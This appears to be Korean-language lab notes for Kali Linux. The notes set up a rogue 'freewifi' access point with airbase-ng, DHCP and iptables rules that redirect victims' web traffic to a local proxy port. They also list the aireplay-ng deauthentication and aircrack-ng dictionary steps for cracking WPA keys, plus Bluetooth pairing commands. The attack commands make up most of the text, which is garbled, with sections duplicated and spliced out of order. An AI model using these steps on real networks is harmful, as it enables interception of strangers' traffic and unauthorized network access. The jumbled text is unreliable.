#kali - Fake AP 설치 및 설정
	1. 실습 전 작업
kali#airmon-ng stop mon0
kali#service network-manager restart
kali#service networking restart

	2. 인터넷 정상 통신 확인
-cat /etc/resolv.conf

-nslookup www.naver.com

	3. Station에게 할당할 DHCP서버 설치
-apt-get -y install isc-dhcp-server
-nano /etc/dhcpd.conf
//
Authoritative;
Default-lease-time 600;
Max-lease-time 7200;
Subnet 192.168.1.0 netmask 255.255.255.0{
Option routers 192.168.1.1;
Option subnet-mask 255.255.255.0;
Option domain-name "freewifi";
Option domain-name-servers 192.168.1.1;
Range 192.168.1.2 192.168.1.40;
}
//
	4. Dpkg -L isc-dhcp-server 
[ dpkg: 데비안에서 패키지 관리 시스템 ]

	5. airmon 활성화 (wlan interface 확인)
kali# airmon-ng start wlan0

fake ap 실행 (mon interface 확인)
- kali# airbase-ng -c 채널 -e freewifi mon0

들어진 fake ap 설정 (at interface 확인)
kali# ifconfig at0 192.168.1.1 netmask 255.255.255.0
kali# ifconfig at0 mtu 1400
	
라우팅 추가 및 포워딩 설정
	#> route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
	#> echo 1 > /proc/sys/net/ipv4/ip_forward
	#> iptables -t nat -A PREROUTING -p udp -j DNAT --to 192.168.0.1
	#> iptables -P FORWARD ACCEPT
	#> iptables --append FORWARD --in-interface at0 -j ACCEPT
	#> iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
	#> iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
	#> dhcpd -cf /etc/dhcpd.conf -pf /var/run/dhcpd.pid at0
	#> service isc-dhcp-server start![](http://)
    #kali - Fake AP 설치 및 설정
	1. 실습 전 작업
kali#airmon-ng stop mon0
kali#service network-manager restart
kali#service networking restart

	2. 인터넷 정상 통신 확인
-cat /etc/resolv.conf

-nslookup www.naver.com

	3. Station에게 할당할 DHCP서버 설치
-apt-get -y install isc-dhcp-server
-nano /etc/dhcpd.conf
//
Authoritative;
Default-lease-time 600;
Max-lease-time 7200;
Subnet 192.168.1.0 netmask 255.255.255.0{
Option routers 192.168.1.1;
Option subnet-mask 255.255.255.0;
Option domain-name "freewifi";
Option domain-name-servers 192.168.1.1;
Range 192.168.1.2 192.168.1.40;
}
//
	4. Dpkg -L isc-dhcp-server 
[ dpkg: 데비안에서 패키지 관리 시스템 ]
#kali - Fake AP 설치 및 설정
	1. 실습 전 작업
kali#airmon-ng stop mon0
kali#service network-manager restart
kali#service networking restart

	2. 인터넷 정상 통신 확인
-cat /etc/resolv.conf

-nslookup www.naver.com

	3. Station에게 할당할 DHCP서버 설치
-apt-get -y install isc-dhcp-server
-nano /etc/dhcpd.conf
//
Authoritative;
Default-lease-time 600;
Max-lease-time 7200;
Subnet 192.168.1.0 netmask 255.255.255.0{
Option routers 192.168.1.1;
Option subnet-mask 255.255.255.0;
Option domain-name "freewifi";
Option domain-name-servers 192.168.1.1;
Range 192.168.1.2 192.168.1.40;
}
//
	4. Dpkg -L isc-dhcp-server 
[ dpkg: 데비안에서 패키지 관리 시스템 ]

	5. airmon 활성화 (wlan interface 확인)
kali# airmon-ng start wlan0

fake ap 실행 (mon interface 확인)
- kali# airbase-ng -c 채널 -e freewifi mon0

들어진 fake ap 설정 (at interface 확인)
kali# ifconfig at0 192.168.1.1 netmask 255.255.255.0
kali# ifconfig at0 mtu 1400
	
라우팅 추가 및 포워딩 설정
	#> route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
	#> echo 1 > /proc/sys/net/ipv4/ip_forward
	#> iptables -t nat -A PREROUTING -p udp -j DNAT --to 192.168.0.1
	#> iptables -P FORWARD ACCEPT
	#> iptables --append FORWARD --in-interface at0 -j ACCEPT
	#> iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
	#> iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
	#> dhcpd -cf /etc/dhcpd.conf -pf /var/run/dhcpd.pid at0
	#> service isc-dhcp-server start![](http://)
    
    
#Bluetooth 설치
-sudo apt-get upgrade & update -y
-apt-get install bluetooth bluez-utils bulez-compat
- 블루투스 장치 확인
-lsusb |grep -|bluetooth
++
	Bluetoothctl
	Help
	Power on
	Scan on
	Agent on
++

검색된 장치와 페어링을 위해
Pair Mac주소
이때 장치에 따라 PIN Code 입력을 요구할 수도 있다.
Trust 장치 mac 주소 -> 페어링 대상 장치를 신뢰할 수 있는 장치로 설정

#WPA Crack
airmon-ng start wlan0
airodump-ng mon0
airmon-ng stop mon0
airmon-ng start wlan 7
airodump-ng --channel 7 --bssid [AP맥주소] -w 저장파일이름 mon0
aireplay-ng -0 [몇개] -a [AP맥주소] -c [AP에연결되어잇는장치맥주소] mon0
- aircrack-ng -b [AP맥주소] -w [사전파일] [캡처한파일명]

참조 URL : http://lureout.tistory.com/127
	5. airmon 활성화 (wlan interface 확인)
kali# airmon-ng start wlan0

fake ap 실행 (mon interface 확인)
- kali# airbase-ng -c 채널 -e freewifi mon0

들어진 fake ap 설정 (at interface 확인)
kali# ifconfig at0 192.168.1.1 netmask 255.255.255.0
kali# ifconfig at0 mtu 1400
	
라우팅 추가 및 포워딩 설정
	#> route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
	#> echo 1 > /proc/sys/net/ipv4/ip_forward
	#> iptables -t nat -A PREROUTING -p udp -j DNAT --to 192.168.0.1
	#> iptables -P FORWARD ACCEPT
	#> iptables --append FORWARD --in-interface at0 -j ACCEPT
	#> iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
	#> iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
	#> dhcpd -cf /etc/dhcpd.conf -pf /var/run/dhcpd.pid at0
	#> service isc-dhcp-server start![](http://)
    
    
#Bluetooth 설치
-sudo apt-get upgrade & update -y
-apt-get install bluetooth bluez-utils bulez-compat
- 블루투스 장치 확인
-lsusb |grep -|bluetooth
++
	Bluetoothctl
	Help
	Power on
	Scan on
	Agent on
++

검색된 장치와 페어링을 위해
Pair Mac주소
이때 장치에 따라 PIN Code 입력을 요구할 수도 있다.
Trust 장치 mac 주소 -> 페어링 대상 장치를 신뢰할 수 있는 장치로 설정

#WPA Crack
airmon-ng start wlan0
airodump-ng mon0
airmon-ng stop mon0
airmon-ng start wlan 7
airodump-ng --channel 7 --bssid [AP맥주소] -w 저장파일이름 mon0
aireplay-ng -0 [몇개] -a [AP맥주소] -c [AP에연결되어잇는장치맥주소] mon0
- aircrack-ng -b [AP맥주소] -w [사전파일] [캡처한파일명]

참조 URL : http://lureout.tistory.com/127
    
#Bluetooth 설치
-sudo apt-get upgrade & update -y
-apt-get install bluetooth bluez-utils bulez-compat
- 블루투스 장치 확인
-lsusb |grep -|bluetooth
++
	Bluetoothctl
	Help
	Power on
	Scan on
	Agent on
++

검색된 장치와 페어링을 위해
Pair Mac주소
이때 장치에 따라 PIN Code 입력을 요구할 수도 있다.
Trust 장치 mac 주소 -> 페어링 대상 장치를 신뢰할 수 있는 장치로 설정

#WPA Crack
airmon-ng start wlan0
airodump-ng mon0
airmon-ng stop mon0
airmon-ng start wlan 7
airodump-ng --channel 7 --bssid [AP맥주소] -w 저장파일이름 mon0
aireplay-ng -0 [몇개] -a [AP맥주소] -c [AP에연결되어잇는장치맥주소] mon0
- aircrack-ng -b [AP맥주소] -w [사전파일] [캡처한파일명]

참조 URL : http://lureout.tistory.com/127
